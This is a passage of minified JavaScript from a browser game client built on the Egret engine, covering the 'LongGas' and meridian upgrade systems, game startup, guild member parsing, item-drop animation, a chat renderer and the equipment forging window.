e.jobID=0,e.siteArr=[],e.unlockGasIDArr=[],e.longActIDArr=[],e.openSelectID=1,e.outDrawValue=0,e.LongGasCount=0,e.useLongGas=0,e.atrrValueArr=[{type:2,value:0},{type:141,value:0},{type:142,value:0},{type:5,value:0},{type:6,value:0}],e.sysId=PackageID.Weapons,e.regNetMsg(20,e.postLongGasData),e.regNetMsg(21,e.returnGetUpTupoData),e.regNetMsg(22,e.returnActLongGasData),e.regNetMsg(23,e.setEntityOutLongGas),e.regNetMsg(24,e.setEntitLongGasGo),e.regNetMsg(25,e.returnLongUseData),e.initRed(),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initRed=function(){this.AllBagRed=new h.RedPoint(this.returnRedP,f.BagCT.ins().postItemChange)},e.prototype.returnRedP=function(){if(!g.OpenSystem.ins().checkSysOpen(p.SystemType.LongGas))return!1;var t=u.GlobalConfig.LoongGasCfg;if(!t)return!1;for(var i in t){var n=e.ins().returnByLongGasRed(t[i].id);if(n)return!0}return!1},e.prototype.returnByLongGasRed=function(t){var i,n=null===(i=u.GlobalConfig.LoongGasCfg[t])||void 0===i?void 0:i.actcond;if(!n)return!1;for(var o in n){var s=e.ins().returnByLongGasSiteRed(n[o]);if(s)return!0}return!1},e.prototype.returnByLongGasSiteRed=function(t){var i=e.ins().getSlotByInfo(t);if(!i){var o=u.GlobalConfig.LoongGasPosCfg[t];if(!o)return!1;var s=0;for(var a in o[0].cost)n.GlobalFun.checkCost(o[0].cost[a].count,o[0].cost[a].id,"",!1,null,!1)||s++;return 0==s?!0:!1}var r=0;for(var a in i.cost)n.GlobalFun.checkCost(i.cost[a].count,i.cost[a].id,"",!1,null,!1)||r++;var l=u.GlobalConfig.LoongGasPosCfg[t][i.level+1];return l&&0==r?!0:!1},e.prototype.postLongGasData=function(t){var e=Object.keys(u.GlobalConfig.LoongGasPosCfg);this.LongGasSiteInfoData={};for(var i=0;i<e.length;i++){var n=e[i];this.LongGasSiteInfoData[n]||(this.LongGasSiteInfoData[n]={})}this.siteArr=[],this.LongGasSiteInfoData={},this.unlockGasIDArr=[],this.longActIDArr=[];for(var o=(t.readUnsignedByte(),t.readShort()),i=0;o>i;i++){var s=t.readShort(),a=t.readInt();this.siteArr.push({id:s,lv:a}),this.LongGasSiteInfoData[s]={};var r=new v;r.setInfo(s,a),this.LongGasSiteInfoData[s][a]=r}for(var l=t.readShort(),i=0;l>i;i++){var s=t.readShort(),a=t.readUnsignedByte();this.unlockGasIDArr.push({id:s,lv:a})}for(var h=t.readShort(),i=0;h>i;i++){var s=t.readShort();this.longActIDArr.push(s)}this.useLongGas=t.readUnsignedByte(),this.updataLongInfo()},e.prototype.updataLongInfo=function(){},e.prototype.setGetUpTupo=function(t){var e=this.getBytes(21);e.writeByte(this.jobID),e.writeShort(t),this.sendToServer(e)},e.prototype.returnGetUpTupoData=function(t){var e=(t.readUnsignedByte(),t.readShort()),i=t.readInt(),n=0;for(var o in this.siteArr)if(this.siteArr[o].id==e){this.siteArr[o].lv=i,this.LongGasSiteInfoData[e]={};var s=new v;s.setInfo(e,i),this.LongGasSiteInfoData[e][i]=s,n++}if(0==n){this.siteArr.push({id:e,lv:i}),this.LongGasSiteInfoData[e]={};var s=new v;s.setInfo(e,i),this.LongGasSiteInfoData[e][i]=s}this.updateGETUPTOP()},e.prototype.updateGETUPTOP=function(){},e.prototype.setGetLongGas=function(t){var e=this.getBytes(22);e.writeByte(this.jobID),e.writeShort(t),this.sendToServer(e)},e.prototype.returnActLongGasData=function(t){var e=(t.readUnsignedByte(),t.readShort()),i=t.readUnsignedByte(),n=0;for(var o in this.unlockGasIDArr)if(this.unlockGasIDArr[o].id==e){n++,this.unlockGasIDArr[o].lv=i;break}0==n&&this.unlockGasIDArr.push({id:e,lv:i}),this.updateActLongGas()},e.prototype.updateActLongGas=function(){},e.prototype.setCancelLongGas=function(t){var e=this.getBytes(23);e.writeByte(this.jobID),e.writeShort(t),this.sendToServer(e)},e.prototype.setEntityOutLongGas=function(t){var e=t.readDouble(),i=(t.readUnsignedByte(),t.readShort()),n=l.EntityManager.ins().getEntityByHandle(e);n&&n.data&&n.data.type==EntityType.Role&&(n.infoModel&&(n.data.isMy&&(this.outDrawValue=c.SubRoles.ins().getSubRoleByIndex(0).longGasID=i),n.infoModel.longGasID=i),n.data.demonCirID=i),d.ActorCC.postUpdateLongGas()},e.prototype.setLongGasGo=function(t){var e=this.getBytes(24);e.writeByte(this.jobID),e.writeByte(t),e.writeShort(this.openSelectID),this.sendToServer(e)},e.prototype.setEntitLongGasGo=function(t){var e=(t.readUnsignedByte(),t.readUnsignedByte()),i=t.readShort();for(var n in this.longActIDArr)this.longActIDArr[n]==i&&2==e&&(this.longActIDArr[n]=0);1==e&&this.longActIDArr.push(i);var o=this.longActIDArr.filter(function(t){return 0!==t});this.longActIDArr=[];for(var n in o)this.longActIDArr.push(o[n]);this.updateUseSkill()},e.prototype.updateUseSkill=function(){},e.prototype.setLongItemUse=function(){var t=this.getBytes(25);t.writeByte(this.jobID),this.sendToServer(t)},e.prototype.returnLongUseData=function(t){this.useLongGas=t.readUnsignedByte(),this.updateLongUseSkill()},e.prototype.updateLongUseSkill=function(){},e.prototype.returnLongGasUnlockDataByID=function(t){for(var e in this.unlockGasIDArr)if(this.unlockGasIDArr[e].id==t)return this.unlockGasIDArr[e];return null},e.prototype.getSiteLvByID=function(t){for(var e in this.siteArr)if(this.siteArr[e].id==t)return this.siteArr[e].lv;return 0},e.prototype.selectOpenLongGasByID=function(t){this.openSelectID=t},e.prototype.getAllLongGasAtrr=function(){var t=[],e=[],i=u.GlobalConfig.LoongGasPosCfg;if(i){for(var n in this.atrrValueArr)t.push({type:this.atrrValueArr[n].type,value:this.atrrValueArr[n].value});for(var n in this.siteArr){var s=i[this.siteArr[n].id][this.siteArr[n].lv].attr;for(var a in s)t.push(s[a])}for(var n in t){var r=0;for(var a in e)t[n].type==e[a].type&&(e[a].value+=t[n].value,r++);0==r&&e.push({type:t[n].type,value:t[n].value})}}var l=[];if(this.useLongGas>0){var h=u.GlobalConfig.LoongGasSkillCfg[this.useLongGas];if(h)for(var p in e){var d={type:e[p].type,value:e[p].value*h.attr[e[p].type]/1e4};l.push(d)}}var c=this.returnAttStr(e),f=this.returnAttStr(l),g=c.split("\n"),m=f.split("\n"),v=[];for(var y in g){var d=void 0;d=m[y]?{type:g[y],value:"+（"+o.AttributeData.getSubstringAfter(m[y],"：")+"）"||!1}:{type:g[y],value:""},v.push(d)}return v},e.prototype.getLongGasAtrrById=function(){var t=[],e=[],i=u.GlobalConfig.LoongGasCfg,n=i[this.openSelectID].actcond,o=u.GlobalConfig.LoongGasPosCfg;if(o){for(var s in this.atrrValueArr)t.push({type:this.atrrValueArr[s].type,value:this.atrrValueArr[s].value});for(var s in this.siteArr)for(var a in n)if(this.siteArr[s].id==n[a]){var r=o[this.siteArr[s].id][this.siteArr[s].lv].attr;for(var l in r)t.push(r[l])}for(var s in t){var h=0;for(var l in e)t[s].type==e[l].type&&(e[l].value+=t[s].value,h++);0==h&&e.push({type:t[s].type,value:t[s].value})}}var p=this.returnAttStr(e),d=p.split("\n"),c=[];for(var f in d){var g={type:d[f],value:""};c.push(g)}return c},e.prototype.getSlotByInfo=function(t){var e;if(!this.LongGasSiteInfoData)return e;if(!this.LongGasSiteInfoData[t])return e;for(var i in this.LongGasSiteInfoData[t]){e=this.LongGasSiteInfoData[t][i];break}return e},e.prototype.returnLenOfLoongGasArr=function(){var t=u.GlobalConfig.LoongGasCfg;this.LongGasCount=0;for(var e in t)this.LongGasCount++;var i=c.SubRoles.ins().getSubRoleByIndex(0);this.outDrawValue=i.longGasID||0},e.prototype.returnAttStr=function(t,e){void 0===e&&(e=null);var i=s.AttributeFormat.FORMAT_1();i.wordColor=null,i.attrColor=null;for(var n in t)if((t[n].type==a.AttributeType.atAtkMin||t[n].type==a.AttributeType.atAtkMax||t[n].type==a.AttributeType.atAtkTaoistMin||t[n].type==a.AttributeType.atAtkTaoistMax||t[n].type==a.AttributeType.atAtkMageMin||t[n].type==a.AttributeType.atAtkMageMax||t[n].type==a.AttributeType.atRes||t[n].type==a.AttributeType.atDef)&&(i.nameType=e,t[n].type==a.AttributeType.atAtkMin||t[n].type==a.AttributeType.atAtkMax))switch(d.ActorCC.jobId){case 2:t[n].type+=4;break;case 3:t[n].type+=2}return o.AttributeData.getAttStr1(t,i)},__decorate([post()],e.prototype,"updataLongInfo",null),__decorate([post()],e.prototype,"updateGETUPTOP",null),__decorate([post()],e.prototype,"updateActLongGas",null),__decorate([post()],e.prototype,"updateUseSkill",null),__decorate([post()],e.prototype,"updateLongUseSkill",null),__decorate([post()],e.prototype,"selectOpenLongGasByID",null),e}(r.BaseSystem);e.LongGasCT=m,window.LongGasCT=m,__reflect(m.prototype,"LongGasCT",[]),Systemap.LongGasCT=function(){return m.ins()},window.LongGasCT=m;var v=function(){function t(){this.id=0,this.level=0,this.cost=[],this.showlv=0,this.assault=0,this.icon="",this.name="",this.attr=[],this.ex_attr=[]}return t.prototype.setInfo=function(t,e){if(t>0&&e>0){var i=u.GlobalConfig.LoongGasPosCfg[t][e];if(!i)return;this.id=i.id,this.level=i.level,this.cost=i.cost,this.showlv=i.showlv,this.assault=i.assault,this.icon=i.icon+"",this.name=i.name,this.attr=i.attr}},t}();e.LongGasSiteInfo=v,window.LongGasSiteInfo=v,__reflect(v.prototype,"LongGasSiteInfo",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.JingMaiCT=void 0;var n=i(14),o=i(13),s=i(2),a=i(0),r=i(6),l=i(4),h=i(17),u=function(t){function e(){var e=t.call(this)||this;return e.liantiDataList=[],e.rp=new h.RedPoint,e.sysId=PackageID.JingMai,e.regNetMsg(1,e.doUpData),e.regNetMsg(4,e.doBigUpLevel),e.regNetMsg(5,e.doLianTiUpdate),observe(e,e.initRps,o.SubRoles.ins().doSubRole),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initRps=function(){this.rp=new h.RedPoint(function(){var t,e;return null===(e=null===(t=o.SubRoles.ins().getSubRoleByIndex(0))||void 0===t?void 0:t.jingMaiData)||void 0===e?void 0:e.jingMaiCanUp()},this.postUpdate,r.BagCT.ins().postItemAdd,r.BagCT.ins().postItemCountChange,r.BagCT.ins().postItemDel,l.ActorCC.postGoldChange)},e.prototype.sendBoost=function(t){var e=this.getBytes(1);e.writeShort(t),this.sendToServer(e)},e.prototype.sendUpgrade=function(t){var e=this.getBytes(2);e.writeShort(t),this.sendToServer(e)},e.prototype.doUpData=function(t){var e=t.readShort(),i=o.SubRoles.ins().getSubRoleByIndex(e);i&&(i.jingMaiData.parser(t),this.postUpdate())},e.prototype.postUpdate=function(){},e.prototype.sendBigUpLevel=function(t){var e=this.getBytes(4);e.writeInt(t),this.sendToServer(e)},e.prototype.sendLianTiUpLevel=function(t){var e=this.getBytes(5);e.writeShort(t),this.sendToServer(e)},e.prototype.doBigUpLevel=function(t){var e,i=t.readInt();if(i)e=gettext("道具不足够");else{var n=t.readInt();n||(e=gettext("使用成功，经脉等阶+1"))}e&&s.TipsCT.ins().showTips(e)},e.prototype.doLianTiUpdate=function(t){var e=t.readUnsignedByte(),i=!1;if(1==e)for(var n=t.readShort(),o=t.readInt(),a=t.readInt(),r=t.readInt(),l=0;l<this.liantiDataList.length;l++)this.liantiDataList[l].type==n&&(o<=this.liantiDataList[l].lv?s.TipsCT.ins().showTips(gettext("修炼失败")):i=!0,this.liantiDataList[l].lv=o,this.liantiDataList[l].curBless=a,this.liantiDataList[l].percent=r);else{this.liantiDataList=[];for(var l=0;e>l;l++){var n=t.readShort(),o=t.readInt(),a=t.readInt(),r=t.readInt();this.liantiDataList.push({type:n,lv:o,curBless:a,percent:r})}}this.postLianTiUpdate(i)},e.prototype.getMaxLiantiAtt=function(t){var e=[];for(var i in this.liantiDataList)e.push(this.liantiDataList[i].lv);return e.sort(this.arrSort),t?e[e.length-1]:e[0]},e.prototype.arrSort=function(t,e){return t-e},e.prototype.postLianTiUpdate=function(t){return t},e.prototype.canGradeupJingMai=function(){for(var t,e=[!1,!1,!1],i=0,n=0,s=o.SubRoles.ins().subRolesLen,l=0;s>l;l++){var h=o.SubRoles.ins().getSubRoleByIndex(l);if(t=a.GlobalConfig.JingMaiLevelConfig[h.jingMaiData.level],i=t.count){var u=r.BagCT.ins().getBagGoodsCountById(r.BagCT.BAG_TYPE_OTHTER,200103);if(u){e[l]=!0;break}n=r.BagCT.ins().getBagGoodsCountById(r.BagCT.BAG_TYPE_OTHTER,t.itemId),e[l]=n>=i}else e[l]=!1}return e},e.prototype.checkOpen=function(t){void 0===t&&(t=!1);var e="",i=a.GlobalConfig.JingMaiCommonConfig;return l.ActorCC.level<i.openLevel&&(e=gettext("{0}级开启",i.openLevel)),t&&""!=e&&s.TipsCT.ins().showTips(e),""==e},__decorate([post()],e.prototype,"postUpdate",null),__decorate([post()],e.prototype,"postLianTiUpdate",null),e}(n.BaseSystem);e.JingMaiCT=u,window.JingMaiCT=u,__reflect(u.prototype,"JingMaiCT",[]),Systemap.JingMaiCT=function(){return u.ins()},window.JingMaiCT=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GameApp=void 0;var n=i(619),o=i(61),s=i(112),a=i(20),r=i(0),l=i(69),h=i(714),u=i(23),p=i(90),d=i(103),c=i(64),f=i(31),g=function(){function t(){this.inited=!1}return t.ins=function(){return this._ins=this._ins||new t,this._ins},t.prototype.init=function(){var t,e;return __awaiter(this,void 0,void 0,function(){var i,c,g,m,v,y;return __generator(this,function(C){switch(C.label){case 0:return this.inited?[2]:(this.inited=!0,o.LocationProperty.init(),egret.lifecycle.addLifecycleListener(function(t){}),egret.lifecycle.onPause=function(){console.log("@@切换---切换后台"),l.SoundUtil.onPause(),l.SoundUtil.enable=!1,u.GameLogic.ins().isBack=!0},egret.lifecycle.onResume=function(){console.log("@@切换---恢复前台"),l.SoundUtil.enable=s.SysSetting.ins().getBool(s.SysSetting.SOUND_EFFECT),l.SoundUtil.onResume(),u.GameLogic.ins().sendSyncServerTime(),u.GameLogic.ins().isBack=!1},[4,RES.getResByUrl(MAP_DIR+"maps.json")]);case 1:i=C.sent(),a.GameMap.init(i);for(c in Systemap)Systemap[c]();return r.GlobalConfig.init(),f.initGlobleTxt(),ResourceMgr.ins().setValue(r.GlobalConfig.ClientGlobalConfig.resourceMax),console.log("egret.Capabilities.supportedCompressedTexture",egret.Capabilities.supportedCompressedTexture),g=function(t){return t&&!(t.url.indexOf("map/")>-1||t.url.indexOf("res/model/")>-1||t.url.indexOf("res/skilleff/")>-1||t.url.indexOf("image/item/")>-1)},(urlParam.isMiniGame&&1==r.GlobalConfig.ClientGlobalConfig.miniktx||!urlParam.isMiniGame&&1==r.GlobalConfig.ClientGlobalConfig.ktx)&&(null===(e=null===(t=egret.Capabilities)||void 0===t?void 0:t.supportedCompressedTexture)||void 0===e?void 0:e.etc1)&&(m=RES.processor._map.image,RES.processor.map("pack.etc1.ktx",new h.PackETC1KTXProcessor),RES.processor.map("image",new n.CompressTextureProcessor(g,!0,m)),console.log("openKTX",egret.Capabilities.supportedCompressedTexture.etc1)),v=p.DeviceUtils.IsLiuHai,v&&(win.setTop(v),y=new eui.Rect,y.top=0,y.height=v,y.width=d.StageUtils.ins().getWidth(),y.fillColor=0,d.StageUtils.ins().getStage().addChild(y)),[2]}})})},t.prototype.logined=function(){return __awaiter(this,void 0,void 0,function(){return __generator(this,function(t){return win.openCall=function(){u.GameLogic.ins().postViewOpen(),c.MainUICC.openCloseUpdate(),c.MainUICC.initPayFun()},win.closeCall=function(){u.GameLogic.ins().postViewOpen(),c.MainUICC.openCloseUpdate()},ObjectPool.clearClass("TipsItem"),win.close("TipsView"),win.open("TipsView"),this.postLoginInit(),[2]})})},t.prototype.postLoginInit=function(){},t.prototype.postZeroInit=function(){},__decorate([post()],t.prototype,"postLoginInit",null),__decorate([post()],t.prototype,"postZeroInit",null),t}();e.GameApp=g,window.GameApp=g,__reflect(g.prototype,"GameApp",[]),window.GameApp=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildMemberInfo=void 0;var n=function(){function t(){this.level=0,this.zsLevel=0}return t.prototype.parse=function(t){this.roleID=t.readInt(),this.vipLevel=t.readInt(),this.attack=t.readInt(),this.sex=t.readUnsignedByte(),this.job=t.readUnsignedByte(),this.name=t.readString(),this.zsLevel=t.readInt(),this.score=t.readInt(),this.winRate=t.readInt()/100>>0,this.KfArenaCount=t.readUnsignedByte(),this.isJoinkfArena=1==t.readUnsignedByte()},t.prototype.copyData=function(t){for(var e in t)this[e]=t[e]},t}();e.GuildMemberInfo=n,window.GuildMemberInfo=n,__reflect(n.prototype,"GuildMemberInfo",[]),window.GuildMemberInfo=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DropHelp=void 0;var n=i(50),o=i(16),s=i(13),a=i(20),r=i(32),l=i(23),h=i(100),u=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.ins=function(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return t.ins.call(this,e)},e.init=function(t,e){this.dropContainer=t,this.dropNameContainer=e},e.start=function(t){this.mainEntity=t?t:s.SubRoles.lookAtTar,a.GameMap.fbType==r.FbCT.FB_TYPE_GUANQIABOSS||a.GameMap.fbType==r.FbCT.FB_TYPE_9||a.GameMap.fbType==r.FbCT.FB_KF||a.GameMap.fbType==r.FbCT.FB_TYPE_DEVILDOM_BOSS||a.GameMap.fbType==r.FbCT.FB_TYPE_SHI_KONG_ZHI_JING?Timer.start(800,1,this.delayTweenItem,this.ins()):Timer.has(this.findDrop,this.ins())||Timer.start(100,0,this.findDrop,this.ins()),this.starting=!0},e.stop=function(){Timer.stopAll(this.ins()),this.starting=!1},e.delayTweenItem=function(){if(!e.getItemCount())return void e.checkDrop();var t=e.mainEntity;if(!t)return void e.clearDrop();for(var i in e.itemPos)e.tweenItem(e.itemPos[i],t,i)},e.tweenItem=function(t,i,n){if(null==t)return void console.warn("掉落物Item=null，不能缓动！");var s=egret.Tween.get(t),a=500*Math.random()+200;s.wait(a).to({x:i.x+.5*h.mainfightcc.gridW,y:i.y+.5*h.mainfightcc.gridH},450,egret.Ease.backIn).call(function(){egret.Tween.removeTweens(t),o.DisplayUtils.removeFromParent(t),delete e.itemPos[n],e.getItemCount()||e.checkDrop()},e)},e.getItemCount=function(){return e.itemPos?Object.keys(e.itemPos).length:0},e.addDrop=function(t){var e=t[0],i=t[1],n=t[2],o=t[3]||0,s=ObjectPool.pop("CharItem2");s.infoModel={itemData:n,q:o};var r=0,h=0,u=0,p="|";if(this.itemPos[e+p+i]||!a.GameMap.checkWalkable(e,i)){for(u=0;u<this.orderX.length&&(r=e+this.orderX[u],h=i+this.orderY[u],0==a.GameMap.checkWalkable(r,h)||null!=this.itemPos[r+p+h]);u++);if(u>=this.orderX.length)for(var d=2,c=!0,f=200;c;){for(var g=e-d;e+d>g&&c;g++)for(var m=i-d;i+d>m&&c;m++)r=g,h=m,0!=a.GameMap.checkWalkable(r,h)&&null==this.itemPos[r+p+h]&&(c=!1);if(d>=f)break;d++}}else r=e,h=i;s.x=a.GameMap.grip2Point(r),s.y=a.GameMap.grip2Point(h),this.itemPos[r+p+h]=s,l.GameLogic.ins().createEntity2(s)},e.clearDrop=function(){this.stop();for(var t in this.itemPos)o.DisplayUtils.removeFromParent(this.itemPos[t]),ObjectPool.push(this.itemPos[t]),delete this.itemPos[t];this.curTarget=null,this.completeFunc&&(this.completeFunc.func.call(this.completeFunc.funcThis),this.completeFunc=null)},e.findDrop=function(){},e.checkDrop=function(){return this.getItemCount()?void 0:(this.stop(),void(this.completeFunc&&(this.completeFunc.func.call(this.completeFunc.funcThis),this.completeFunc=null)))},e.addCompleteFunc=function(t,e){this.completeFunc={func:t,funcThis:e}},e.tempDropPoint=new egret.Point,e.itemPos={},e.orderX=[-1,1,-1,0,1,-1,0,1],e.orderY=[0,0,1,1,1,-1,-1,-1],e.waitTime=0,e.lastPoint=new egret.Point,e}(n.BaseClass);e.DropHelp=u,window.DropHelp=u,__reflect(u.prototype,"DropHelp",[]),window.DropHelp=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ChatListItemRenderer3=void 0;var n=i(3),o=i(186),s=i(182),a=i(297),r=i(163),l=i(120),h=i(106),u=i(44),p=i(45),d=i(8),c=function(t){function e(){var e=t.call(this)||this;return e.emojiTxt=new o.EmojiText,e.clickGrp=new eui.Group,e.clickGrp.x=e.clickGrp.y=0,e.clickGrp.touchEnabled=!0,e.emojiTxt.x=0,e.emojiTxt.lineSpacing=8,e.emojiTxt.textColor=13746831,e.emojiTxt.touchEnabled=!0,e.addChild(e.emojiTxt),e.addChild(e.clickGrp),e.emojiTxt.msgTxt&&e.emojiTxt.msgTxt.addEventListener(egret.TextEvent.LINK,e.txtLink,e),e.clickGrp.addEventListener(egret.TouchEvent.TOUCH_TAP,e.onClickName,e),e}return __extends(e,t),e.prototype.dataChanged=function(){this.showHead.visible=!1,this.showText.visible=!1,this.chatVip.visible=!1;var t=this.data,e=0,i="",n="",u="",p="",c=t.times?d.DateUtils.formatMiniDateTime(t.times)/1e3:0,f="";
if(t instanceof s.GuildMessageInfo)i=o.EmojiText.GUILD_IMG,u=t.content,t.office&&(n=-1!=u.indexOf("<a")&&-1!=u.indexOf("</a>")?"<a color=0x"+h.GuildLanguage.guildOfficeColor[t.office]+"</a>["+h.GuildLanguage.guildOffice[t.office]+"]":"|C:0x"+h.GuildLanguage.guildOfficeColor[t.office]+"&T:["+h.GuildLanguage.guildOffice[t.office]+"]|");else if(t instanceof a.ChatCampData)i=o.EmojiText.ZY_IMG,u=t.content;else if(t instanceof r.ChatSystemData)i=o.EmojiText.SYS_IMG,u=t.str;else{var g="";g=t.type==l.TagChanneID.ciChannelKuaFu?o.EmojiText.KF_IMG:o.EmojiText.ALL_IMG,i=g,u=t.str}var m;-1!=u.indexOf("<a")&&-1!=u.indexOf("/a>")?(m=u,t.name&&(p="<a color=0x16B2FF</a>["+t.name+"]"),f=c>0?"<a color=0x16B2FF</a>["+d.DateUtils.getFormatBySecond(c,d.DateUtils.TIME_FORMAT_15)+"]|":""):(m="|C:0xDFD1B5&T:"+u+"|",t.name&&(p="|C:0x16B2FF&T:["+t.name+"]|"),f=c>0?"|C:0x16B2FF&T:["+d.DateUtils.getFormatBySecond(c,d.DateUtils.TIME_FORMAT_15)+"]|":""),this.emojiTxt.richText=""+i+f+n,this.clickGrp.x=this.emojiTxt.msgTxt.textWidth,this.emojiTxt.richText=""+i+f+n+p+" ",this.clickGrp.width=this.emojiTxt.msgTxt.textWidth-this.clickGrp.x,this.clickGrp.height=this.emojiTxt.msgTxt.height,getLangType()==LanguageEnum.AR&&(this.clickGrp.x=this.emojiTxt.msgTxt.width-this.emojiTxt.msgTxt.textWidth),this.emojiTxt.textWidth=e||this.textGroup.width,getLangType()==LanguageEnum.AR&&isArabic(""+i+n+p+f+" "+m)?this.emojiTxt.richText=""+i+p+f+n+" "+m:this.emojiTxt.richText=""+i+f+n+p+" "+m,this.height=this.emojiTxt.uHeight+14},e.prototype.txtLink=function(t){p.ChatCT.ins().handleTxtLink(this.data,t.text)},e.prototype.onClickName=function(t){p.ChatCT.ins().MsgOpenWin=!1,u.ReadPlayerCT.ins().sendFindPlayer(this.data.id)},e}(n.BaseItemRender);e.ChatListItemRenderer3=c,window.ChatListItemRenderer3=c,__reflect(c.prototype,"ChatListItemRenderer3",[]),window.ChatListItemRenderer3=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForgeWin=void 0;var n=i(21),o=i(16),s=i(1),a=i(0),r=i(4),l=i(13),h=i(2),u=i(96),p=i(683),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="forgeskin",e.curRole=0,e.mcList=[],e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t,e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];observe(this,this.onEvent,u.ForgeCT.ins().postForgeUpdate),observe(this,this.delayRedPoint,p.ForgeRedPoint.ins().postForgeBoostRedPoint),observe(this,this.delayRedPoint,p.ForgeRedPoint.ins().postForgeZhulingRedPoint),observe(this,this.delayRedPoint,p.ForgeRedPoint.ins().postForgeGemRedPoint),observe(this,this.delayRedPoint,p.ForgeRedPoint.ins().postForgeWeaponRedPoint);var n=e[0];isNaN(n)&&(n=Math.max(this.viewStack.getItemIndex(null===(t=this[n])||void 0===t?void 0:t.name),0));var o=this.viewStack.getChildAt(n);this.sTitle=o.winTitle||"",this.tab.selectedIndex=this.viewStack.selectedIndex=n},e.prototype.skinComplete=function(){this.viewStack.selectedIndex=e.Page_Select_Boost,this.tab.dataProvider=this.viewStack,this.mc=new n.MovieClip,this.mc.x=240,this.mc.y=400;for(var t=0;8>t;t++){var i=new n.MovieClip;i.x=240,i.y=400,this.mcList.push(i)}this.addChangeEvent(this.tab,this.onTabTouch),this.addChangingEvent(this.tab,this.onTabTouching)},e.prototype.removeDisplay=function(){o.DisplayUtils.removeFromParent(this.mc);for(var t=0;t<this.mcList.length;t++)o.DisplayUtils.removeFromParent(this.mcList[t]);Timer.stopAll(this)},e.prototype.openEff=function(t){t.bottom=t.top=0},e.prototype.onTabTouch=function(t){this.setOpenIndex(t.currentTarget.selectedIndex)},e.prototype.onTabTouching=function(t){return this.checkIsOpen(t.currentTarget.selectedIndex)?void 0:void t.preventDefault()},e.prototype.setOpenIndex=function(t,e){this.tab.selectedIndex!=this.viewStack.selectedIndex&&this.checkAutoBtn();var i=this.viewStack.getChildAt(t);this.sTitle=i.winTitle||""},e.prototype.checkIsOpen=function(t){switch(t){case e.Page_Select_Gem:var i=a.GlobalConfig.StoneOpenConfig[0].openLv;if(r.ActorCC.level<i)return h.TipsCT.ins().showTips(gettext("精炼{0}级开启",i)),!1;break;case e.Page_Select_Weapon:}return!0},e.prototype.delayRedPoint=function(){this.tab.updateReds()},e.prototype.checkAutoBtn=function(){this.ForgeBoostPanel.isAutoUp&&this.ForgeBoostPanel.stopAutoUp(),this.ForgeZhulingPanel.isAutoUp&&this.ForgeZhulingPanel.stopAutoUp()},e.prototype.onEvent=function(t){var i=t[0],n=t[1],o=l.SubRoles.ins().getSubRoleByIndex(this.curRole);switch(i){case PackageID.strongthen:if(e.Page_Select_Boost==this.viewStack.selectedIndex){if(!this.ForgeBoostPanel.isAutoUp){if(this.mcList[n].x=n%2*434+40,this.mcList[n].y=120*Math.floor(n/2)+35,this.mcList[n].playFile(RES_DIR_EFF+"UpEff1",1),!this.ForgeBoostPanel||!this.ForgeBoostPanel.itemGroup)return void platform.reportError("onEvent:"+this.skin);this.ForgeBoostPanel.itemGroup.addChild(this.mcList[n])}this.ForgeBoostPanel.autoUpBack(n)}break;case PackageID.Zhuling:e.Page_Select_ZhuLing==this.viewStack.selectedIndex&&(this.ForgeZhulingPanel.isAutoUp||(this.mcList[n].x=this.ForgeZhulingPanel["kuang"+n].x+this.ForgeZhulingPanel["kuang"+n].width/2,this.mcList[n].y=this.ForgeZhulingPanel["kuang"+n].y+this.ForgeZhulingPanel["kuang"+n].height/2,this.mcList[n].playFile(RES_DIR_EFF+"UpEff1",1),this.ForgeZhulingPanel.itemGroup.addChild(this.mcList[n])),n=o.getMinEquipIndexByType(e.Page_Select_ZhuLing),this.ForgeZhulingPanel.autoUpBack(n))}},e.Page_Select_Boost=0,e.Page_Select_Gem=1,e.Page_Select_ZhuLing=2,e.Page_Select_Weapon=3,__decorate([callDelay(100)],e.prototype,"delayRedPoint",null),e}(s.BaseView);e.ForgeWin=d,window.ForgeWin=d,__reflect(d.prototype,"ForgeWin",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForgeConst=void 0;var n,o=i(62),n=window.ForgeConst;!function(t){t.CAN_FORGE_EQUIP=[o.EquipPos.WEAPON,o.EquipPos.HEAD,o.EquipPos.CLOTHES,o.EquipPos.NECKLACE,o.EquipPos.Wrist,o.EquipPos.BRACELET,o.EquipPos.RING,o.EquipPos.SHOE],t.EQUIP_POS_TO_SUB=[],t.EQUIP_POS_TO_SUB[o.EquipPos.WEAPON]=0,t.EQUIP_POS_TO_SUB[o.EquipPos.HEAD]=1,t.EQUIP_POS_TO_SUB[o.EquipPos.CLOTHES]=2,t.EQUIP_POS_TO_SUB[o.EquipPos.NECKLACE]=3,t.EQUIP_POS_TO_SUB[o.EquipPos.Wrist]=4,t.EQUIP_POS_TO_SUB[o.EquipPos.BRACELET]=5,t.EQUIP_POS_TO_SUB[o.EquipPos.RING]=6,t.EQUIP_POS_TO_SUB[o.EquipPos.SHOE]=7,t.EQUIP_POS_TO_SUB[o.EquipPos.DZI]=8,t.EQUIP_POS_TO_SUB[o.EquipPos.HAT]=9,t.EQUIP_POS_TO_SUB[o.EquipPos.HAT2]=10,t.EQUIP_POS_TO_SUB[o.EquipPos.VIZARD]=11,t.EQUIP_POS_TO_SUB[o.EquipPos.CLOAK]=12,t.EQUIP_POS_TO_SUB[o.EquipPos.SHIELD]=13,t.EQUIP_POS_TO_SUB[o.EquipPos.PowerRing]=14,t.EQUIP_POS_TO_SUB[o.EquipPos.MabiRing]=15,t.EQUIP_POS_TO_SUB[o.EquipPos.NoDamRing]=16,t.EQUIP_POS_TO_SUB[o.EquipPos.ReviveRing]=17,t.EQUIP_POS_TO_SUB[o.EquipPos.Medal]=18,t.EQUIP_POS_TO_SUB[o.EquipPos.JadePendant]=19,t.EQUIP_POS_TO_SUB[o.EquipPos.EquipType_Aegis]=20